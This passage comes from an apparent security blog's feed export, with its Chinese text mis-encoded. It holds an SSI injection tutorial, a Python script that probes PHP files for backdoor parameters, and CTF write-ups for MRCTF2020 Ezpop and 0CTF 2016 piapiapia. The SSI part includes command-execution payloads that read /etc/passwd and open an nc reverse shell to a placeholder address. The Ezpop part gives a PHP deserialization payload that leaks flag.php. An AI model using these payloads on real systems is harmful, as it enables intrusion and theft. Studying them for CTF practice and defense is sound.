ç‰ˆæœ¬ä¸­çš„ä¸€ä¸ªæ—§æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡åŠ¨æ€é“¾æ¥åº“ï¼ˆssinc.dllï¼‰ä¸­çš„ç¼“å†²åŒºæº¢å‡ºæ•…éšœæ¥è·å–ç³»ç»Ÿæƒé™ã€‚â€œssinc.dllâ€ç”¨äºè§£é‡Šè¿›ç¨‹æœåŠ¡å™¨ç«¯åŒ…å«ã€‚ CVE 2001-0506ã€‚é€šè¿‡åˆ›å»ºåŒ…å«ä»¥ä¸‹ SSI ä»£ç çš„æ¶æ„é¡µé¢å¹¶å¼ºåˆ¶åº”ç”¨ç¨‹åºåŠ è½½æ­¤é¡µé¢ï¼ˆè·¯å¾„éå†æ”»å‡»ï¼‰ï¼Œå¯ä»¥æ‰§è¡Œæ­¤æ”»å‡»ï¼šssi_over.shtml&lt;!--#include file=â€UUUUUUUU...UUâ€--&gt;PSï¼šâ€œUâ€çš„æ•°é‡éœ€è¦å¤§äº2049ã€‚å¼ºåˆ¶åº”ç”¨ç¨‹åºåŠ è½½ ssi_over.shtml é¡µé¢ï¼šéæ¶æ„ç½‘å€ï¼šwww.vulnerablesite.org/index.asp?page=news.aspæ¶æ„ç½‘å€ï¼šwww.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtmlå¦‚æœ IIS è¿”å›ç©ºç™½é¡µï¼Œåˆ™è¡¨æ˜å‘ç”Ÿäº†æº¢å‡ºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ“çºµç¨‹åºæµå¹¶æ‰§è¡Œä»»æ„ä»£ç ã€‚</code></pre></li></ul><h1 id="SSIæŒ–æ˜æ€è·¯"><a href="#SSIæŒ–æ˜æ€è·¯" class="headerlink" title="SSIæŒ–æ˜æ€è·¯"></a>SSIæŒ–æ˜æ€è·¯</h1><p>ä¸¤ä¸ªæ€è·¯ï¼š</p><ul><li>ä»ä¸šåŠ¡åœºæ™¯æ¥Fuzzï¼Œæ¯”å¦‚è·å–IPã€å®šä½ã€æ—¶é—´ç­‰</li><li>è¯†åˆ«é¡µé¢æ˜¯å¦åŒ…å«.stm,.shtmå’Œ.shtmlåç¼€</li><li><a href="https://v.duoyinsu.com/"><strong>ä¼ç‰¹åˆ†å¸ƒå¼æ¼æ´æ‰«æå¹³å°</strong></a><strong>å·²ç»å…¨é¢æ”¯æŒSSIæ£€æµ‹ã€‚</strong></li></ul><p>google dorkï¼šâ€™inurl:bin/cklbâ€™</p><h1 id="SSIæ¼æ´å¤ç°"><a href="#SSIæ¼æ´å¤ç°" class="headerlink" title="SSIæ¼æ´å¤ç°"></a>SSIæ¼æ´å¤ç°</h1><h2 id="æœ¬åœ°æµ‹è¯•"><a href="#æœ¬åœ°æµ‹è¯•" class="headerlink" title="æœ¬åœ°æµ‹è¯•"></a>æœ¬åœ°æµ‹è¯•</h2><p>æˆ‘ä»¬ä½¿ç”¨bWAPPæ¥åšæ¼æ´æ¼”ç¤ºç¯å¢ƒ</p><p>é€‰æ‹©ï¼šâ€™Server-Side Includes (SSI) Injectionâ€™</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"> </p><p>æˆåŠŸæ‰§è¡Œäº†ä»£ç ã€‚</p><pre><code>å†ä½¿ç”¨ä¸‹execæŒ‡ä»¤ä½¿ç”¨cmdä½œä¸ºå‚æ•°æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤ï¼š&#39;&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;&#39;</code></pre><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h2><p>è¿æ°”å¥½ï¼Œåˆšå¥½é‡åˆ°ä¸ªæŸSRCçš„ã€‚</p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>æ‰§è¡Œå‘½ä»¤</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</code></pre><p>åå¼¹shell</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="SSIé˜²å¾¡"><a href="#SSIé˜²å¾¡" class="headerlink" title="SSIé˜²å¾¡"></a>SSIé˜²å¾¡</h1><ul><li>å…³é—­æœåŠ¡å™¨SSIåŠŸèƒ½</li><li>è¿‡æ»¤ç›¸å…³SSIç‰¹æ®Šå­—ç¬¦ï¼ˆ<code>&lt;,&gt;,#,-,&quot;,&#39;</code>ï¼‰</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»ç½‘ç«™æºç ä¸­å¯»æ‰¾åé—¨è„šæœ¬</title>
      <link href="/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">import osimport requestsimport reimport threadingimport timeprint(&#39;å¼€å§‹æ—¶é—´ï¼š  &#39;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)                                            #è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;os.chdir(filePath)                                                    #æ”¹å˜å½“å‰çš„è·¯å¾„requests.adapters.DEFAULT_RETRIES = 5                                #è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥files = os.listdir(filePath)session = requests.Session()session.keep_alive = False                                             # è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#39;utf-8&#39;) as f:                            #æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data = &#123;&#125;                                                        #æ‰€æœ‰çš„$_POST    params = &#123;&#125;                                                        #æ‰€æœ‰çš„$_GET    for m in gets:        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;    url = &#39;http://127.0.0.1/src/&#39;+file    req = session.post(url, data=data, params=params)            #ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST    req.close()                                                # å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜    req.encoding = &#39;utf-8&#39;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:                                    #å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°        flag = 0        for a in gets:            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content = req.text            req.close()                                                # å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data=&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)                content = req.text                req.close()                                                # å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:                                                    #flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ            param = a        else:            param = b        print(&#39;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#39;+file+&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot; %param)        print(&#39;ç»“æŸæ—¶é—´ï¼š  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                                                            #åŠ å…¥å¤šçº¿ç¨‹   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> è„šæœ¬ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezpop</title>
      <link href="/2021/10/13/MRCTF2020-Ezpop/"/>
      <url>/2021/10/13/MRCTF2020-Ezpop/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>æ‰“å¼€ç½‘é¡µï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code>Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; </code></pre><p>ä¸‹é¢æ˜¯æœ¬é¢˜ä¸€äº›é­”æœ¯æ–¹æ³•çš„ä»‹ç»ï¼š</p><pre><code>__construct å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚__wakeup() ä½¿ç”¨unserializeæ—¶è§¦å‘__get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®#éš¾ä»¥è®¿é—®åŒ…æ‹¬ï¼šï¼ˆ1ï¼‰ç§æœ‰å±æ€§ï¼Œï¼ˆ2ï¼‰æ²¡æœ‰åˆå§‹åŒ–çš„å±æ€§__invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ã€‚</code></pre><p>é¦–å…ˆè§‚å¯Ÿæ•æ„Ÿå‡½æ•°ï¼Œåœ¨Modifierä¸­å‘ç°æ•æ„Ÿå‡½æ•°include(),è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¯åˆ©ç”¨ç‚¹ã€‚é—®é¢˜çš„å…³é”®ç‚¹å°±ç®—å¦‚ä½•è°ƒç”¨Modifierä¸­çš„include()å‡½æ•°ã€‚å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼š__invoke(),å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ï¼Œé‚£ä¹ˆé—®é¢˜å°±è½¬åŒ–ä¸ºå¦‚ä½•é€šè¿‡æ„å»ºpopé“¾æ¥è§¦å‘è¿™ä¸ªå‡½æ•°ã€‚</p><p>Showç±»ä¸­ __ constructå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ä½†æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ•æ„Ÿç‚¹, __ toStringé­”æœ¯æ–¹æ³•ã€‚å®ƒçš„ä½œç”¨ä¸»è¦å°±æ˜¯èƒ½echoä¸€ä¸ªå®ä¾‹åŒ–çš„ç±»ï¼ˆå¦‚æœè¿™ä¸ªç±»æ²¡æœ‰ __ toString()ï¼Œåˆ™ä¼šæŠ¥é”™ï¼‰ï¼Œå› ä¸ºechoæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__toString()ã€‚é‚£ä¹ˆæˆ‘ä»¬çœ‹å¦‚ä½•æ‰èƒ½è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å‘ç°showç±»ä¸­è¿˜æœ‰ä¸€ä¸ªè¿‡æ»¤ï¼š</p><pre><code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code></pre><p>preg_matchï¼ˆï¼‰å‡½æ•°ç”¨åˆ°sourceï¼Œå¦‚æœsourceæ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™ç›´æ¥æ‹¿æ¥åŒ¹é…ã€‚<br> å¦‚æœsourceæ˜¯ä¸€ä¸ªç±»ä¸”è¿™ä¸ªç±»é‡Œæœ‰__ toString()æ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨__ toString()ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä½¿sourceä¸ºä¸€ä¸ªç±»æ¥è°ƒç”¨__ toString æ–¹æ³•ã€‚</p><p>source = new Show();</p><p>è°ƒç”¨__ toStringåä¼šè¿”å›è¿™ä¸ªï¼š</p><pre><code> return $this-&gt;str-&gt;source;</code></pre><p>æˆ‘ä»¬è¦è€ƒè™‘è¯¥å¦‚ä½•åˆ©ç”¨è¿™ä¸ªã€‚</p><p>å¦‚æœä»¤ $this-&gt;str = new Test(),Test()ç±»ä¸­æ²¡æœ‰source,åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨ __ get(),è¿”å›ä¸€ä¸ªå˜é‡åŠ æ‹¬å·ï¼Œå³å‡½æ•° $p()ã€‚å¦‚æœæˆ‘ä»¬å†è®©$p = new Modifier()ã€‚åˆ™ç›¸å½“äºè¿”å›ä¸€ä¸ªç±»å‡½æ•°ï¼Œåˆ™ä¼šè°ƒç”¨Modifierçš„ __invoke() ï¼Œç”¨ $varè¯»å–flag.phpå³å¯.</p><p>payload:</p><pre><code>&lt;?phpclass Modifier &#123;    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt;</code></pre><p>æ€è€ƒï¼šä¸ºä»€ä¹ˆè¿™é‡Œè¦ç”¨urlencodeç¼–ç è¿›è¡ŒåŠ å¯†ï¼Ÿ</p><p>å› ä¸º$varæ˜¯protected ç±»å‹ï¼Œåºåˆ—åŒ–åè¦æ‰‹åŠ¨åŠ ä¸€äº›å­—ç¬¦æ‰èƒ½é€šè¿‡ã€‚</p><p>è´´ä¸€æ®µä»£ç ï¼š</p><p><img src="/2021/10/13/MRCTF2020-Ezpop/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0CTF 2016-piapiapia</title>
      <link href="/2021/10/10/0CTF-2016-piapiapia/"/>
      <url>/2021/10/10/0CTF-2016-piapiapia/</url>
      
        <content type="html"><![CDATA[<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h1><p>ä»£ç å®¡è®¡è¿˜æœ‰PHPååºåˆ—åŒ–ä¸€ç›´æ˜¯æˆ‘çš„ç¡¬ä¼¤ï¼Œæ‰€ä»¥æƒ³å€ŸåŠ©è¿™ä¸ªé¢˜ç›®æ¥ç†ä¸€ç†æ€è·¯ã€‚</p><p>é¦–å…ˆï¼Œæ‰“å¼€ç½‘å€ï¼Œå¦‚å›¾ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010224803224.png" alt="image-20211010224803224"></p><p>å…ˆå°è¯•äº†ä¸‡èƒ½å¯†ç ï¼Œæ²¡æœ‰æ•ˆæœã€‚</p><p>sqlæ³¨å…¥ï¼Œæ‰‹å·¥å’Œsqlmapè·‘åŠå¤©æ²¡æœ‰æ•ˆæœï¼Œæ”¾å¼ƒã€‚</p><p>æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åšçš„ï¼Œå°±æ‰«ä¸€æ‰«ç›®å½•ã€‚</p><p>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * -s 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p><p>buuæ‰«ç›®å½•ä¸€ç›´å®¹æ˜“å´©æºƒï¼Œæ‰€ä»¥è¦é™ä½dirsearchçš„æ‰«æé€Ÿåº¦ã€‚</p><p>æœ€ç»ˆæ‰«æå‡ºæ¥äº† register.php å’Œ<a href="http://www.zip./">www.zipã€‚</a></p><p>è¿›å…¥ xxx/register.php :<br><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225335750.png" alt="image-20211010225335750"> </p><p>æ³¨å†Œè´¦å·å¹¶ç™»å½•ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225502569.png" alt="image-20211010225502569"></p><p>è€ƒè™‘äº†æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ å¤šæ¬¡ï¼Œæ²¡æœ‰æ•ˆæœï¼Œæ”¾å¼ƒï¼</p><p>æ›´æ–°æ–‡ä»¶åï¼Œè¿›å…¥è¿™ä¸ªç•Œé¢ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225645545.png" alt="image-20211010225645545"></p><p>å°±æ­¤åœä¸‹ï¼Œä¸çŸ¥é“å¦‚ä½•è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œå†³å®šä»æºç å…¥æ‰‹ã€‚</p><p>è®¿é—® <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip</a></p><p>è·å–åˆ°äº†ç½‘ç«™æºç ã€‚</p><p>è¿›è¡Œè‹¦é€¼çš„ä»£ç å®¡è®¡ï¼š</p><p>ç”±ä¸Šæ–¹å¯çŸ¥é€»è¾‘ç»“æ„ä¸ºï¼šregister-&gt;login-&gt;update-&gt;profile</p><p>ç™»å½•å’Œæ³¨å†Œå¯ä»¥å…ˆä¸çœ‹ï¼Œç”± update-&gt;profile</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225831335.png" alt="image-20211010225831335"></p><p>é¦–å…ˆæŸ¥çœ‹config.phpï¼Œçœ‹åˆ°äº†flagä½†æ˜¯ä¸ºç©ºï¼Œæ²¡æœ‰æ˜¾ç¤º,è¿™é‡Œè¦æ³¨æ„ä¸‹config.phpï¼Œä¸‹é¢å¯èƒ½ä¼šç”¨åˆ°ã€‚</p><p>ç»§ç»­æµè§ˆä»£ç ï¼Œå¯»æ‰¾æ•æ„Ÿç‚¹ï¼š</p><p>åœ¨profile.phpä¸­å‘ç°äº†ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œunserialize(),file_get_contents()</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p>çŒœæµ‹åº”è¯¥è€ƒå¯ŸPHPååºåˆ—åŒ–ï¼Œ$profile[â€˜photoâ€™] æ˜¯é‡ç‚¹ï¼Œè€ƒè™‘å¯¹å…¶ä¼ å€¼ï¼Œå®ç°flagçš„è¯»å–ã€‚</p><p>è¿›ä¸€æ­¥å®¡è®¡ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230732653.png" alt="image-20211010230732653"></p><p>åœ¨update.phpä¸­å‘ç°äº†è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>$profile[â€˜photoâ€™] = â€˜upload/â€˜ . md5($file[â€˜nameâ€™]);</p><p>å‘ç°è¯¥å€¼è¢«hashåŠ å¯†äº†ï¼Œæ ¹æœ¬æ— æ³•å¯¹å…¶è¿›è¡Œæ§åˆ¶ã€‚</p><p>æ—¢ç„¶profile[â€˜photoâ€™] æ— æ³•æ§åˆ¶ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥è€ƒè™‘ä¼ å…¥å…¶å®ƒå€¼æ¥è¾¾åˆ°ç›®çš„ã€‚çœ‹profile[â€˜photoâ€™]çš„ä¸Šä¸€ä¸ªå‚æ•°ï¼Œprofile[â€˜nicknameâ€™]ï¼Œæ˜¯å¦å¯ä»¥é€šè¿‡profile[â€˜nicknameâ€™]ä¼ å€¼ç»™profile[â€˜photoâ€™]å‘¢.</p><p>ç»§ç»­çœ‹unserialize($profile)</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232230667.png" alt="image-20211010232230667"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232355284.png" alt="image-20211010232355284"></p><p>ç”±æ­¤å¯çŸ¥ï¼Œå¯¹åƒuserä¸­show_profile()çš„è¿”å›å€¼è¢«ååºåˆ—åŒ–ï¼ŒæŸ¥çœ‹show_porfileå‡½æ•°ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010233728714.png" alt="image-20211010233728714"></p><p>$usernameé¦–å…ˆä¼šè¢«è¿‡æ»¤ä¸€æ¬¡ï¼Œè·Ÿè¿›filter()å‡½æ•°ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235353988.png" alt="image-20211010235353988"></p><p>è¿™é‡Œçš„æ„æ€æ˜¯\ä¼šè¢«|æ›¿ä»£ï¼Œä¸€äº›æ•æ„Ÿçš„sqlå•è¯ä¼šè¢«hackerä»£æ›¿(ä¸Šæ–‡çš„select,insert,update,delete,where)</p><p>è¿‡æ»¤åï¼Œ$usernameä¼šè¢«æ’å…¥åˆ°selectè¯­å¥ä¸­ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235733254.png" alt="image-20211010235733254"></p><p>åˆ°æ­¤ï¼ŒåŸºæœ¬æ˜ç™½äº†ç½‘ç«™çš„è¿è¡Œé€»è¾‘ã€‚</p><p>æ¥ä¸‹æ¥ç»§ç»­ä»ååºåˆ—åŒ–å…¥æ‰‹ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>æ¥ä¸Šé¢çš„æ€è·¯ï¼Œç”±äºprofile=[â€˜photoâ€™] æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œè€Œfileterè¿‡æ»¤ï¼Œå¦‚æœå­˜åœ¨whereåˆ™ä¼šå˜ä¸ºhackerï¼Œå¢åŠ äº†ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹åº”è¯¥ä¸ºå­—ç¬¦ä¸²å¢åŠ çš„PHPååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™é‡Œä¼šå¯¹$profileè¿›è¡Œåºåˆ—åŒ–ã€‚</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011003440679.png" alt="image-20211011003440679"></p><p>ä¿®æ”¹phptoçš„å€¼</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011010728666.png" alt="image-20211011010728666"></p><p>è¦æ³¨æ„ï¼Œæœ€åè¿˜è¦é€šè¿‡update.phpä¸­è¿˜å­˜åœ¨ä¸€ä¸ªé™åˆ¶ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011011455216.png" alt="image-20211011011455216"></p><p>nicknameçš„é•¿åº¦ä¸å¯ä»¥&gt;10,é‚£è¯¥æ€ä¹ˆç»•è¿‡å®ƒå‘¢ï¼Ÿ</p><p>è¿™é‡Œå°±è¦ç”¨åˆ°æ•°ç»„äº†</p><pre><code>md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) =nullpreg_match(pattern,Array()) = falsestrcmp(Array(), â€œabcâ€) =nullstrpos(Array(),â€œabcâ€) = nullstrlen(Array()) = null</code></pre><p>æ‰€ä»¥nicknameä¼ å…¥æ•°ç»„å°±å¯ä»¥ç»•è¿‡ã€‚</p><p>å¦‚ä½•å°†nicknameå˜ä¸ºæ•°ç»„å‘¢ï¼Ÿè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014313810.png" alt="image-20211011014313810"></p><p>è¦è®© </p><pre><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>é€ƒé€¸å‡ºæ¥</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014619609.png" 